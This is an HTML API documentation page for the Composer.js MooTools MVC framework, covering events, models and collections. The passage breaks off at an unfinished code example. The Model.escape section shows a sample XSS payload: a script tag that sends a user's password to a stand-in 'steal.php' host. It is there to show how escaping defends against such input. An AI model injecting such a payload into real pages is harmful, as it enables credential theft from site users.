<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
	<meta http-equiv="Content-language" content="en" />

	<title>Composer.js - overview and documentation</title>


	<link rel="stylesheet" type="text/css" href="doc.css" />
</head>
<body>

<div id="container" class="clear">

<div id="nav">
	<ul>
		<li><a href="#overview"><strong>Composer.js</strong></a></li>
		<li><a href="#overview:download">Download / Dependencies</a></li>
		<li><a href="#overview:diff">Framework comparison</a></li>
		<h2>API Documentation</h2>
		<li>
			<a href="#api:events">Events</a>
			<ul>
				<li><a href="#api:events:bind">bind</a></li>
				<li><a href="#api:events:unbind">unbind</a></li>
				<li><a href="#api:events:trigger">trigger</a></li>
			</ul>
		</li>
		<li>
			<a href="#api:model">Model</a>
			<ul>
				<li><a href="#api:model:extend">extend</a></li>
				<li><a href="#api:model:constructor">init / constructor</a></li>
				<li><a href="#api:model:set">set</a></li>
				<li><a href="#api:model:unset">unset</a></li>
				<li><a href="#api:model:get">get</a></li>
				<li><a href="#api:model:escape">escape</a></li>
				<li><a href="#api:model:has">has</a></li>
				<li><a href="#api:model:clear">clear</a></li>
				<li><a href="#api:model:id">id</a></li>
				<li><a href="#api:model:cid">cid</a></li>
				<li><a href="#api:model:data">data</a></li>
				<li><a href="#api:model:toJSON">toJSON</a></li>
				<li><a href="#api:model:defaults">defaults</a></li>
				<li><a href="#api:model:fetch">fetch</a></li>
				<li><a href="#api:model:save">save</a></li>
				<li><a href="#api:model:destroy">destroy</a></li>
				<li><a href="#api:model:validate">validate</a></li>
				<li><a href="#api:model:get_url">get_url</a></li>
				<li><a href="#api:model:base_url">base_url</a></li>
				<li><a href="#api:model:url">url</a></li>
				<li><a href="#api:model:collections">collections</a></li>
				<li><a href="#api:model:highest_priority_collection">highest_priority_collection</a></li>
				<li><a href="#api:model:parse">parse</a></li>
				<li><a href="#api:model:clone">clone</a></li>
				<li><a href="#api:model:is_new">is_new</a></li>
			</ul>
		</li>					
		<li>
			<a href="#api:collection">Collection</a>
			<ul>
				<li><a href="#api:collection:extend">extend</a></li>
				<li><a href="#api:collection:model">model</a></li>
				<li><a href="#api:collection:constructor">init / constructor</a></li>
				<li><a href="#api:collection:models">models</a></li>
				<li><a href="#api:collection:priority">priority</a></li>
				<li><a href="#api:collection:toJSON">toJSON</a></li>
				<li><a href="#api:collection:add">add</a></li>
				<li><a href="#api:collection:remove">remove</a></li>
				<li><a href="#api:collection:clear">clear</a></li>
				<li><a href="#api:collection:reset">reset</a></li>
				<li><a href="#api:collection:sortfn">sortfn</a></li>
				<li><a href="#api:collection:parse">parse</a></li>
				<li><a href="#api:collection:each">each</a></li>
				<li><a href="#api:collection:find">find</a></li>
				<li><a href="#api:collection:exists">exists</a></li>
				<li><a href="#api:collection:find_by_id">find_by_id</a></li>
				<li><a href="#api:collection:find_by_cid">find_by_cid</a></li>
				<li><a href="#api:collection:index_of">index_of</a></li>
				<li><a href="#api:collection:query">query</a></li>
				<li><a href="#api:collection:first">first</a></li>
				<li><a href="#api:collection:last">last</a></li>
				<li><a href="#api:collection:url">url</a></li>
				<li><a href="#api:collection:get_url">get_url</a></li>
				<li><a href="#api:collection:fetch">fetch</a></li>
			</ul>
		</li>
		<li>
			<a href="#api:controller">Controller</a>
			<ul>
				<li><a href="#api:controller:extend">extend</a></li>
				<li><a href="#api:controller:constructor">init / constructor</a></li>
				<li><a href="#api:controller:el">el</a></li>
				<li><a href="#api:controller:inject">inject</a></li>
				<li><a href="#api:controller:attach">attach</a></li>
				<li><a href="#api:controller:tag">tag</a></li>
				<li><a href="#api:controller:elements">elements</a></li>
				<li><a href="#api:controller:events">events</a></li>
				<li><a href="#api:controller:render">render</a></li>
				<li><a href="#api:controller:html">html</a></li>
				<li><a href="#api:controller:release">release</a></li>
				<li><a href="#api:controller:replace">replace</a></li>
				<li><a href="#api:controller:delegate_events">delegate_events</a></li>
				<li><a href="#api:controller:refresh_elements">refresh_elements</a></li>
			</ul>
		</li>
		<li>
			<a href="#api:router">Router</a>
			<ul>
				<li><a href="#api:router:constructor">constructor</a></li>
				<li><a href="#api:router:register_callback">register_callback</a></li>
				<li><a href="#api:router:route">route</a></li>
			</ul>
		</li>
		<li>
			<a href="#api:sync">sync</a>
			<ul>
				<li><a href="#api:sync:call">sync.call</a></li>
			</ul>
		</li>
	</ul>
	<p>&nbsp;</p>
</div>

<div id="content">
<h1 id="overview">Composer.js</h1>
<img src="composer.gif"/>
<p>
	Composer.js is a javascript MVC framework for <a href="http://mootools.net/">Mootools</a> that helps you grow 
	and manage your front-end javascript application by splitting out separate pieces of functionality using the 
	Model View Controller design pattern.
</p>
<p>
	Composer.js borrows (and in some cases takes directly from) two incredible existing JS frameworks,
	<a href="http://documentcloud.github.com/backbone/">backbone.js</a> and <a href="http://spinejs.com/">spine</a>, 
	taking from both where we felt they were successful. The javascript world was lacking a Mootools alternative to
	these frameworks, so we built Composer.js.
</p>

<h2 id="overview:download">Download / Dependencies</h2>

<a class="download" href="composer.js">Download 0.7.0</a>
<p>
	Composer's only external dependency is <a href="http://mootools.net">MooTools 1.3+</a>. A good understanding of JavaScript and object oriented
	programming methodology is recommended.
</p>

<h2 id="overview:diff">Framework comparison</h2>
<p>
	How is Composer.js different from <a href="http://documentcloud.github.com/backbone/">Backbone.js</a> and <a href="http://spinejs.com">Spine</a>?
</p>
<table class="compare" cellpadding="0" cellspacing="0" border="0">
	<tr>
		<th width="10%">Feature</th>
		<th width="30%">Backbone</a></th>
		<th width="30%">Spine</th>
		<th width="30%">Composer.js</th>
	</tr>
	<tr>
		<td>Collections</td>
		<td>
			Has a separate object for collections. Models are explicitely added to collections.
		</td>
		<td>
			"Collections" are just a set of static member functions. Any instantiated model of a certain
			type is implicitely added to that model's collection.
		</td>
		<td>
			Has a separate object for collections. Models are explicitely added to collections. 
			<strong>Models can exist in multiple collections.</strong>
		</td>
	</tr>
	<tr>
		<td>REST/ajax</td>
		<td>
			Has server-side data syncing which uses REST-type URLs to CRUD data.
		</td>
		<td>
			Has server-side data syncing which uses REST-type URLs to CRUD data.
		</td>
		<td>
			Assumes nothing about your data syncing and provides a supporting API to implement this yourself.
			We plan to eventually emulate the other two frameworks, but this is not the highest priority.
		</td>
	</tr>
	<tr>
		<td>Event triggering</td>
		<td>
			Supports passing a {silent: true} object to silence all events during an operation.
		</td>
		<td>
			Supports passing a {silent: true} object to silence all events during an operation.
		</td>
		<td>
			Supports passing a {silent: true} object to silence all events during an operation, but also supports
			passing {not_silent: ['add', 'reset']} object to tell the framework "the only events that are allowed
			to fire during this operation are 'add' and 'reset'"
		</td>
	</tr>
	<tr>
		<td>Supporting libraries</td>
		<td>
			One-file library.
		</td>
		<td>
			Has multiple files dealing with different sets of functionality. Overall, has the most supporting
			libraries and functions.
		</td>
		<td>
			One-file library.
		</td>
	</tr>
	<tr>
		<td>"Controller" vs "View"</td>
		<td>View</td>
		<td>Contoller</td>
		<td>Controller</td>
	</tr>
	<tr>
		<td>Framework</td>
		<td>jQuery</td>
		<td>jQuery</td>
		<td>Mootools</td>
	</tr>
</table>
<p>
	Note that this table is meant to highlight the differences. There are many more similarities between the
	frameworks.
</p>

<h1>API Documentation</h1>

<h2 id="api:events">Composer.Events</h2>
<p>
	Events are the main way different pieces of your application communicate with each other. Events are also
	used by the framework itself to notify your application of changes to data or interfaces.
</p>
<p>
	The <a href="#api:model">Model</a>, <a href="#api:collection">Collection</a>, and
	<a href="#api:Controller">Controller</a> objects all implement Events, so anything available in events is
	available in instances of these objects as well.
</p>
<p>
	Example of event being used in your app:
</p>

<pre class="runnable">var MyController = Composer.Controller.extend();

var con = new MyController();

con.bind('alertme', function(name) {
	alert('Hai, '+ name +', this is your alert');
});

con.trigger('alertme', 'Andrew')</pre>
<p>
	Example of event being used by the framework:
</p>
<pre class="runnable">var Note = Composer.Model.extend();
	
var mynote = new Note({ text: 'get a job' });

mynote.bind('change', function(note) {
	alert('Your note changed: '+ note.get('text'));
});

mynote.set({ text: 'my goat hurts' });</pre>
<p>
	The framework triggers events when certain actions happen in your Models or Collections.
</p>


<h3 id="api:events:bind">Events.bind <small>object.bind(String event_name, function callback [, string callback_name])</small></h3>
<p>
	Binds an event to object. The event under "event_name" can be an arbitrary string, or an event used by
	Composer.js internally. You can optionally attach a name (callback_name) to the callback to make it easier
	to unbind later on. More on this further down.
</p>
<p>
	There are two special events to be aware of:
</p>
<ul>
	<li>
		<h4>all</h4>
		<p>
			The "all" event is triggered <em>whenever</em> another event is triggered:
		</p>

		<pre>mymodel.bind('all', function() { alert('something happened!!!!!!!1'); });
			
mymodel.trigger('make_babies');		// <- this will trigger the "all" event</pre>

	</li>
	<li>
		<h4>change:[model key]</h4>
		<p>
			The "change" event is called whenever a model is changed using Model.set(). However, for each key
			in the model that was changed, a specific event will be triggered for that key:
		</p>

		<pre>var mymodel = new MyModel({name: 'larry', age: 54});
			
mymodel.bind('change:name', function(model, value) {
	alert('The new name of the model is '+ value);
});

mymodel.set({ age: 43 });		// <- this will NOT trigger the above event
mymodel.set({ name: 'suzy' });		// <- this will trigger the event, because the name changed</pre>
	</li>
</ul>
<h3 id="api:events:unbind">Events.unbind <small>object.unbind(String event_name, mixed callback)</small></h3>
<p>
	Removes a previously-bound callback function from an object. If no callback is specified, all callbacks for the event will be removed.
	If no event is specified, all event callbacks on the object will be removed.
</p>

<pre>mymodel.unbind("change", onChange);	// Removes the onChange callback
						
mymodel.unbind("change");		// Removes all "change" callbacks

mymodel.unbind();			// Removes all callbacks on the object</pre>


<p>
	As previously mentioned, you can call <code><a href="#api:events:bind">Events.bind</a></code> with an optional
	name parameter that allows you to attach a name to an event. This is useful in cases where you bind a function
	but don't neccessarily have access to the function later on, so wouldn't be able to unbind it. Instead, you 
	can pass the callback's name into <code>Events.unbind</code> instead of the callback itself to unbind it.
</p>
<p>
	The following code is an example of a common problem <em>(the following code won't work as expected)</em>:
</p>

<pre>MyController = Composer.Controller.extend({
	init: function() {
		this.model.bind('change', this.render.bind(this));
		this.model.unbind('change', this.render.bind(this));
	}
})</pre>

<p>
	Notice how we use <code>this.render.bind(this)</code> which creates a wrapper function for this.render. This
	is all fine and good, except that when you call <code>this.model.unbind</code>, the callback being passed in
	is a different function than the one we bound, since MooTools' Function.bind method creates a new wrapper
	function each time called. Instead of tracking all the instances of your bound functions so you can call them
	with unbind later, you can do the following:
</p>

<pre>MyController = Compoer.Controller.extend({
	init: function() {
		this.model.bind('change', this.render.bind(this), 'model_change:render');
		this.model.unbind('change', 'model_change:render');
	}
});</pre>

<p>
	We unbound the function not using the callback as a reference, but the callback's name which we assigned in 
	<code>this.model.bind</code> as the last parameter. This was a common enough instance for us to justify 
	building named callbacks into the Composer event system.
</p>

<h3 id="api:events:trigger">Events.trigger <small>object.trigger(String event_name, [arg1, [arg2, ...]])</small></h3>
<p>
	Trigger the given event of an object. If no callbacks are bound to this event, nothing will happen. If there
	are callbacks bound, they will be called in the order they were bound to the object.
</p>
<p>
	An arbitrary number of arguments can be passed into the trigger function, each of those being passed directly
	into each callback being triggered:
</p>

<pre>mycontroller.bind('tag_clicked', function(tag_name, user_name) {
	alert('user '+ user_name + 'clicked the tag "'+ tag_name +'"');
});
mycontroller.trigger('tag_clicked', 'fisting', 'larry');</pre>

<h2 id="api:model">Model</h2>
<p>
	Models are classes that deal with data, the heart of any JavaScript application. They deal with loading and manipulating data from various
	sources	(AJAX, local storage, etc.), and they make wrapping your actual data easy. Models tie in well with collections or controllers via
	events to allow	for easy updating and rendering.
</p>
<p>
 	Models also tie in with the <code><a href="#api:sync">Composer.sync</a></code> function to provide a central place for saving/updating
	information with a server.
</p>
<p>
	The following is a contrived example, but it demonstrates defining a model with a custom method, setting a data attribute, and firing an event
	keyed to changes in that specific data attribute. After running this code once, <code>sidebar</code> will be available in your browser's
	console, so you can play around with it.
</p>
<pre class="runnable">var Nav = Composer.Model.extend({
	promptColor: function() {
		var cssColor = prompt("Please enter a CSS color:");
		this.set({color: cssColor});
	}
});

window.nav = new Nav;

nav.bind('change:color', function(model, color) {
	$('nav').style.backgroundColor = color;
});

nav.set({color: '#fed'});

nav.promptColor();</pre>

<h3 id="api:model:extend">Model.extend <small>Composer.Model.extend([Object properties], [Base Model Class])</small></h3>
<p>
	To create a Model class of your own, you extend <code>Composer.Model</code> and provide instance properties.
</p>
<pre>var Disease = Composer.Model.extend({

	init: function() { ... },	// runs on instantiation

	get_symptoms: function() { ... },

	is_sexually_transmitted: function() { ... }
});</pre>
<p>
	Models can extend each other to inherit their functions and properties as well:
</p>
<pre>var Herpes = Composer.Model.extend({
	is_sexually_transmitted: function() {return true;}
}, Disease);	// <-- base class passed as second parameter</pre>
<p>
	Herpes has all the properties and functions of "Disease," overriding the parent class' "is_sextually_transmitted" function. 
</p>


<h3 id="api:model:constructor">Model.init / constructor <small>new Model([Object attributes])</small></h3>
<p>
	When creating an instance of a model, you can pass in the initial values of the data attributes, which will be
	<code><a href="#api:model:set">set</a></code> on the model.	If you define an <code>init</code> function, it will be invoked when the model is created.
</p>
<pre class="runnable">var Disease = Composer.Model.extend({
	init: function() {
		alert("you have " + this.get('name') + " lol");
	}
});

var disease = new Disease({
	name: "herpes"
});</pre>

<h3 id="api:model:set">Model.set <small>model.set(Object attributes, [Object options])</small></h3> 
<p>
	Sets one or more data attributes for the model, triggering change events for individual data attributes that change,
	and also a general change event if the model has changed. These events are only triggered if an attribute actually changes;
	setting an attribute to the same value it currently is will not trigger events.
</p>
<p>For example: <code>model.set({name: "fisty", age: 21});</code> will trigger the events:</p>
<ul>
	<li><code>"change:name"</code></li>
	<li><code>"change:age"</code></li>
	<li><code>"change"</code></li>
</ul>
<p>
	If the model belongs to a collection, the events will bubble up to that collection as well, so as to notify the collection of
	any display changes needed.
</p>

<h3 id="api:model:unset">Model.unset <small>model.unset(String attribute, [Object options])</small></h3> 
<p>
	Unsets one data attribute from the model. Fires change events unless a <code>silent</code> option is passed.
</p>

<h3 id="api:model:get">Model.get <small>model.get(String attribute)</small></h3>
<p>Get the current value of a data attribute from the model. For example: <code>disease.get('is_sexually_transmitted')</code></p>

<h3 id="api:model:escape">Model.escape <small>model.escape(String attribute)</small></h3>
<p>
	The same as <code><a href="#api:model:get">get</a></code>, except any HTML characters will be escaped when the data attribute is a string.
	This is	useful for preventing XSS-type attacks when loading data from your model into the DOM.
</p>

<pre class="runnable">var Hacker = Composer.Model.extend();

var hacker = new Hacker({
	name: "&lt;script>window.href = 'http://northkorea.com/steal.php?pw='+user.password&lt;/script&gt;"
});

alert(hacker.escape('name'));</pre>

<h3 id="api:model:has">Model.has <small>model.has(String attribute)</small></h3>
<p>Returns <code>true</code> if the data attribute is set to a non-null or non-undefined value.</p>

<h3 id="api:model:clear">Model.clear <small>model.clear(option)</small></h3>
<p>Clears all data out of the model. Fires change events unless a <code>silent</code> option is passed.</p>

<h3 id="api:model:id">Model.id <small>model.id([Boolean no_cid])</small></h3>
<p>
	Ids are special identifier values, either string or integer, which normally correspond to a database id field value.
	Models can be retrieved by id from collections, and the id is used to
	generate model URLs by default. The <code>id</code> method is a convenient way of retrieving any id stored in the Model's data.
</p>
<pre class="runnable">var Employee = Composer.Model.extend();

var jeff = new Employee({
	id: 657932
});

alert(jeff.id());</pre>
<p>
	By default, the id key is the string <code>"id"</code>, but you can override this with the <code>Model.id_key</code> property. This can be
	useful, for example, if you're using MongoDB and your ids are stored in the <code>_id</code> property.
</p>
<pre>var Employee = Composer.Model.extend({
	id_key: '_id'
});

var jeff = new Employee({
	_id: 657932
});</pre>

<p>
	Models that are newly created may not have an id yet. By default, calling the <code>id</code> method on a model with no id will
	return the model's <code><a href="#api:model:cid">cid</a></code> instead. This behavior can be suppressed by passing <code>true</code>
	into the <code>no_cid</code> parameter, in which case the method will return <code>false</code> when no id exists.
</p>

<h3 id="api:model:cid">Model.cid <small>model.cid()</small></h3>
<p>
	The <strong>cid</strong> (or client id) is a special property of models, a unique identifier automatically assigned to all models when
	they're	first created. Client ids are handy when the model has not yet been saved to the server, and does not yet have its eventual true
	<strong>id</strong>, but needs to be visible and manipulated in the UI. Client ids take the form: <code>c1, c2, c3, ...</code>
</p>
<pre class="runnable">var Employee = Composer.Model.extend();

var jeff = new Employee();

alert(jeff.id());	// they are
alert(jeff.cid());	// the same</pre>

<h3 id="api:model:data">Model.data <small>model.data</small></h3>
<p>
	A model's data attribute contains all of the attributes corresponding to the model's state. These attributes can be accessed using the
	<code><a href="#api:model:get">get</a></code> and <code><a href="#api:model:set">set</a></code> methods.
</p>

<h3 id="api:model:toJSON">Model.toJSON <small>model.toJSON()</small></h3>
<p>
	Returns a copy (not reference) of the model's data attributes. This can be useful for handing off data to views, adding any data as
	necessary without affecting the actual model. Note, this doesn't actually return JSON; the name of this method is a bit confusing,
	because it conforms to JavaScript's JSON API.
</p>

<pre class="runnable">var Employee = Composer.Model.extend();

var peon = new Employee({
	id: 		657932,
	first_name:	'Jeff'
});

alert(peon.toJSON());
alert(peon.toJSON().first_name);
</pre>

<h3 id="api:model:defaults">Model.defaults <small>model.defaults</small></h3>
<p>
	The defaults object can be used to specify the default data attributes for your model. When creating an instance of the model, any unspecified
	attributes will be set to their default value.
</p>

<pre class="runnable">var Meal = Composer.Model.extend({
	defaults: {
		appetizer:  "caesar salad",
		entree:     "ravioli",
		dessert:    "cheesecake"
	}
});

alert("Dessert will be " + (new Meal()).get('dessert'));</pre>

<h3 id="api:model:fetch">Model.fetch <small>model.fetch([Object options])</small></h3>
<p>
	Populates the model's state from the server. Useful if the model has never been populated with data, or if you'd like to ensure that you
	have the latest server state. A "change" event will be triggered if the server's state differs from the current data attributes. Accepts
	<code>success</code> and <code>error</code> callbacks in the options object, which are passed <code>(model, response)</code> as
	arguments.
</p>

<pre>// Get the person model state from server
person.fetch();</pre>

<h3 id="api:model:save">Model.save <small>model.save([Object options])</small></h3>
<p>
	Save a model to your database (or alternative persistence layer), by delegating to <code><a href="#api.sync">Composer.sync</a></code>.
	If the model has a validate method, and validation fails, the model will not be saved. If
	the model <code><a href="#api:model:is_new">is_new()</a></code>, the save will be a <code>"create"</code> (HTTP <code>POST</code>), if the
	model already exists on	the server, the save will be an	<code>"update"</code> (HTTP <code>PUT</code>).
</p>
<p>
	In the following example, notice how our overridden version of <code>Composer.sync</code> receives a <code>"create"</code> request the
	first time the model is saved and an <code>"update"</code> request the second time.
</p>

<pre class="runnable">Composer.sync = function(method, model) {
	alert(method + ": " + JSON.stringify(model));
	model.set({id: 1})
};

var Book = Composer.Model.extend();

var my_book = new Book({
	title: "Quitting Your Job for Dummies",
	author: "Andrew"
});

my_book.save();				// sync does a "create"

my_book.set({author: "Jeff"});
my_book.save();		// sync does an "update"</pre>
<p>
	<strong>save</strong> accepts <code>success</code> and <code>error</code> callbacks in the options hash, which are passed
	<code>(model, response)</code> as arguments. The <code>error</code> callback will also be invoked if the model has a validate
	method, and validation fails. If a server-side validation fails, return a non-200 HTTP response code, along with an error response
	in text or JSON.
</p>
<pre>my_book.save({error: function(){ ... }});</pre>

<h3 id="api:model:destroy">Model.destroy <small>model.destroy([options])</small></h3>
<p>
	Destroys the model on the server by delegating an HTTP <code>DELETE</code> request to <code><a href="#api:sync">Composer.sync</a></code>.
	Accepts <code>success</code> and <code>error</code> callbacks in the options object. Triggers a <code>"destroy"</code> event on the model,
	which will bubble up through any collections that contain it.
</p>

<pre>my_book.destroy({success: function(model, response) {
  ...
}});</pre>

<h3 id="api:model:validate">Model.validate <small>model.validate(Object attributes)</small></h3>
<p>
	This method is left undefined, and you're encouraged to override it with your custom validation logic, if you have any that can be
	performed in JavaScript. <strong>validate</strong> is called before <code>set</code> and <code>save</code>, and is passed the data attributes
	that are about to be updated. If the model and attributes are valid, don't return anything from <strong>validate</strong>; if the
	attributes are invalid, return an <code>error</code> of your choosing. It can be as simple as a string error message to be displayed,
	or a complete error object that describes the error programmatically. <code>set</code> and <code>save</code> will not continue if
	<strong>validate</strong> returns an error. Failed validations trigger an <code>"error"</code> event.
</p>
<pre class="runnable">var Chapter = Composer.Model.extend({
	validate: function(attrs) {
		if (attrs.end &lt; attrs.start) {
			return "can't end before it starts";
		}
	}
});

var one = new Chapter({
	title : "Chapter One: The Beginning"
});

one.bind("error", function(model, error) {
	alert(model.get("title") + " " + error);
});

one.set({
	start: 15,
	end:   10
});</pre>

<p>
	<code>"error"</code> events are useful for providing coarse-grained error messages at the model or collection level, but if you have a specific
	view that can better handle the error, you may override and suppress the event by passing an <code>error</code> callback directly:
</p>
<pre>account.set({access: "unlimited"}, {
	error: function(model, error) {
		alert(error);
	}
});</pre>

<h3 id="api:model:get_url">Model.get_url <small>model.get_url()</small></h3>
<p>
	Returns the relative URL where the model's resource would be located on the server. Generates URLs of the form: <code>"/[collection url]/[id]",</code>
	falling back to	<code>"/[<a href="#api:model:base_url">base_url</a>]/[id]"</code> if the model is not part of a collection. In the case that a
	<code>base_url</code> is specified <em>and</em> the model lives inside a collection, the <code>base_url</code> will take priority and the collection's
	URL scheme will not be used.
</p>
<p>
	<code>get_url</code> delegates to the <code><a href="#api:collection:get_url">Collection.get_url</a></code> method of the highest priority collection that
	the model belongs to in order to generate the URL. Make sure that you have a
	<code>Collection.url</code> defined, or a <a href="#api:model:base_url">Model.base_url</a> property, if all models of this class share a common root
	URL. A model with an id of 101, stored in a <code><a href="#api:collection">Composer.Collection</a></code> with a <code>url</code> of
	<code>"/documents/7/notes"</code>, would have this URL: <code>"/documents/7/notes/101"</code>
</p>
<pre class="runnable">// Demonstrates getting a model's url based on the collection's URL
var Bunny = Composer.Model.extend();

var BunniesCollection = Composer.Collection.extend({
	model: Bunny,
	url: '/bunnies'
});

var chuckles = new Bunny({
	id: 1
});

var collection = new BunniesCollection([chuckles]);

alert(chuckles.get_url());</pre>

<h3 id="api:model:base_url">Model.base_url <small>model.base_url</small></h3>
<p>
	Specify a <code>base_url</code> if you're using a model outside of a collection to enable the <code><a href="#api:model:get_url">get_url</a></code>
	method to generate URLs based on the model id.
</p>
<pre class="runnable">// Demonstrates using a base_url to generate a relative path
var Bunny = Composer.Model.extend({
	base_url:	'/bunny'
});
var chuckles = new Bunny({
	id: 1
});
alert(chuckles.get_url());</pre>

<h3 id="api:model:url">Model.url <small>model.url</small></h3>
<p>
	You can override the default <code><a href="#api:model:get_url">get_url</a></code> behavior and explicitly specify a model's URL by setting
	the <code>Model.url</code> property:
</p>
<pre class="runnable">var Bunny = Composer.Model.extend({
	id:		9001,
	url:	'/bunny_bunny_bunny'
});

alert((new Bunny).get_url());</pre>

<h3 id="api:model:collections">Model.collections <small>model.collections</small></h3>
<p>
	Array containing references to the collection(s) the model is in. The collection with the highest <code>priority</code> property value is used when
	deriving the model's URL via the <code><a href="#api:model:get_url">Model.get_url</a></code> method (which delegates to 
	<code><a href="#api:collection:get_url">Collection.get_url</a></code>).
</p>
<pre class="runnable">// Demonstration of Collection priority
var Bunny = Composer.Model.extend();

var BunniesCollection = Composer.Collection.extend({
	model: Bunny,
	url: '/bunnies',
	priority: 1
});

var MammalsCollection = Composer.Collection.extend({
	model: Bunny,
	url: '/mammals',
	priority: 2
});

var chuckles = new Bunny({
	id: 1
});

var collection1 = new BunniesCollection([chuckles]);
var collection2 = new MammalsCollection([chuckles]);

alert(chuckles.get_url());
</pre>

<h3 id="api:model:highest_priority_collection">Model.highest_priority_collection <small>model.highest_priority_collection()</small></h3>
<p>
	Returns a reference to the member of the <code><a href="#api:model:collections">collections</a></code> array with the highest <code>priority</code>
	property value, or <code>false</code> if the array is empty.
</p>

<h3 id="api:model:parse">Model.parse <small>model.parse(Object response)</small></h3>
<p>
	<strong>parse</strong> is called whenever a model's data is returned by the server, in <code><a href="#api:model:fetch">fetch</a></code>, and
	<code><a href="#api:model:save">save</a></code>. The function is passed the raw <code>response</code> object, and should return the data attributes
	object to be set on the model. The default implementation is a no-op, simply passing through the JSON response. Override this if you need to perform
	any data transformations before setting data into the model.
</p>

<h3 id="api:model:clone">Model.clone <small>model.clone()</small></h3>
<p>Returns a new instance of the model with identical data attributes.</p>

<h3 id="api:model:is_new">Model.is_new <small>model.is_new()</small></h3>
<p>Has this model been saved to the server yet? If the model does not yet have an id, it is considered to be new.</p>

<h2 id="api:collection">Collection</h2>
<p>
	Collections are ordered lists of models and contain various helper functions for finding and selecting subsets of model data.
	They are basically a wrapper around an array; their function is dealing with large amounts of model data. For example, a blog post might have
	a collection of comments&mdash;each individual comment could be a model within the comments collection.
</p>
<p>
	Collections can be bound to <code>"change"</code> events, which trigger when any model in the collection has been modified. They can listen
	for <code>"add"</code> and <code>"remove"</code> events, and can <code>fetch</code> their contents from the server (via
	<code><a href="#api:fetch">Composer.sync</a></code>).
</p>

<h3 id="api:collection:extend">Collection.extend <small>Composer.Collection.extend([Object properties], [Base Collection Class])</small></h3>
<p>
	To create a Collection class of your own, <code>extend</code> Composer.Collection, providing instance properties and optionally another
	Collection class to extend (see <a href="#api:model:extend">Model.extend</a> for example usage).
</p>

<h3 id="api:collection:model">Collection.model <small>collection.model</small></h3>
<p>
	Override this property to specify the model class that the collection contains. If defined, you can pass raw data attributes objects
	to the constructor, <code><a href="#api:collection:add">add</a></code>, and
	<code><a href="#api:collection:reset">reset</a></code>, and the attributes will be converted into a model of the proper type.
</p>
<pre>var Library = Composer.Collection.extend({
	model: Book
});</pre>
<p>
	You can also specify the model as a string. This is useful if for some reason you need to load your collection before your model. Note that
	the model is converted from a string to an object on instantiation (not definition) of the Collection:
</p>
<pre>var Library = Composer.Collection.extend({
	model: 'Book'
});
var library = new Library();	// <-- 'Book' becomes Book here</pre>

<h3 id="api:collection:constructor">Collection.init / constructor <small>new Collection([Array models], [Object properties], [Object options])</small></h3>
<p>
	When creating a Collection, you may choose to pass in the initial array of models via the <code>models</code> parameter. Collection
	properties can be set via the <code>properties</code> object, overriding any defaults. This is useful for specifying a
	<code><a href="#api:collection:sortfn">sortfn</a></code> for sorting. If you define an <code>init</code> function, it will be invoked when
	the	collection is created. The <code>options</code> parameter is passed internally to the <code><a href="#api:collection:reset">reset</a></code>
	method on initialization and before any <code>init</code> function is called.
</p>
<pre class="runnable">var Book = Composer.Model.extend();
	
var Library = Composer.Collection.extend({
	model: Book,
	url: '/Library',
	init: function() {
		alert("I'm a library with " + this.models().length + " books!");
	},
	public: true		// overridden by our example library
});

var book1 = new Book();
var book2 = new Book();
var book3 = new Book();

var lib = new Library( [ book1, book2, book3 ], { public: false } );

alert('is public? ' + lib.public);
</pre>

<h3 id="api:collection:models">Collection.models <small>collection.models()</small></h3> 
<p>
	Wrapper function to get the models under the collection for direct selection.
</p>

<h3 id="api:collection:priority">Collection.priority <small>collection.priority</small></h3> 
<p>
	In Composer, any particular instance of a model can be added to more than one collection. Typically, when a model saves, it needs to invoke
	<code><a href="#api:collection:get_url">Collection.get_url</a></code> in order to derive its url. If the model belongs to more than one
	collection, the collection with the highest <code>priority</code> value is used in determining the url.
</p>
<p>Please see <code><a href="#api:model:collections">Model.collections</a></code> for an example of <code>priority</code> in action.</p>

<h3 id="api:collection:toJSON">Collection.toJSON <small>collection.toJSON()</small></h3>
<p>
	Return an array containing the data object of each model in the collection. This can be used to serialize and persist the collection as a whole.
	The name of this method is a bit confusing, because it conforms to JavaScript's JSON API.
</p>
<pre class="runnable">var Students = Composer.Collection.extend();

var classroom = new Students([
	{name: "Timmy", age: 5},
	{name: "Billy", age: 6},
	{name: "Wendy", age: 9001}
]);

alert(JSON.stringify(classroom));</pre>

<h3 id="api:collection:add">Collection.add <small>collection.add(Mixed models, [Object options])</small></h3>
Add one or more models to the collection. The value of the <code>models</code> parameter can be an object or an array of objects.
If any of these objects is a model, it is added directly to the collection. You
may also pass objects containing raw data attributes and they will be instantiated as models of the type specified in
<code><a href="#api:collection:model">Collection.model</a></code>. Fires <code>"add"</code> events, which you can suppress by passing
<code>{silent: true}</code> in the <code>options</code> parameter. Pass <code>{at: index}</code> in the <code>options</code> parameter
to splice the model into the collection at the specified <code>index</code>.
<pre class="runnable">var Diseases = Composer.Collection.extend();

var your_diseases = new Diseases();

your_diseases.bind("add", function(disease) {
	alert("you have " + disease.get("name") + " lol");
});

// add a single object
your_diseases.add(
	{name: "herpes"}
);

// add an array of objects
your_diseases.add([
	{name: "syphilis"},
	{name: "rectal warts"}
]);
</pre>

<h3 id="api:collection:remove">Collection.remove <small>collection.remove(Mixed models, [Object options])</small></h3>
<p>
	Removes one or more models from the collection. The value of the <code>models</code> parameter can be a model object or an array of model objects.
	Fires <code>"remove"</code> events, which you can suppress by passing <code>{silent: true}</code>
	in the <code>options</code> parameter.
</p>
<pre class="runnable">var Disease		= Composer.Model.extend();
var DiseasesColl	= Composer.Collection.extend();
var your_diseases	= new DiseasesColl();
var herpes 		= new Disease({name: "herpes"});
var rectal_warts 	= new Disease({name: "rectal warts"});
var aids 		= new Disease({name: "AIDS"});

your_diseases.add([herpes, rectal_warts, aids]);

your_diseases.bind("remove", function(disease) {
	alert("congrats! you have been cured of " + disease.get("name") + " lol");
});

your_diseases.remove(aids);</pre>

<h3 id="api:collection:clear">Collection.clear <small>collection.clear([Object options])</small></h3>
<p>
	Removes all models from the collection, triggering a <code>"clear"</code> event unless <code>{silent: true}</code> is passed into <code>options</code>.
</p>

<h3 id="api:collection:reset">Collection.reset <small>collection.reset([Array models], [Object options])</small></h3>
<p>
	Resets a collection with all new model data and triggers a <code>"reset"</code> event. Existing model data is
	<code><a href="#api:collection:clear">clear</a></code>ed out (along with a
	<code>"clear"</code> event) unless an <code>{append: true}</code> option is passed, in which case the model data is appended to the end of the
	collection's list of models. Passing a <code>{silent: true}</code> option will silence all events that would be triggered by this method.
</p>
<pre class="runnable">var Dogs = Composer.Collection.extend();

